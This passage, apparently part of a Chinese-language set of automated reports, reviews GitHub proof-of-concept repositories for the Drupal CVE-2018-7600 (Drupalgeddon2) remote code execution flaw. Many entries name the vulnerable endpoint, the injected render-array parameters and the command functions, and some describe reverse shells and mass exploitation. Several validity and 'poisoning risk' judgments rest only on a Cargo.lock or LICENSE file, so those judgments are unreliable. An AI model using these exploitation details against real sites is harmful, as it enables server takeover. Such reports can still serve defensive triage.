查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

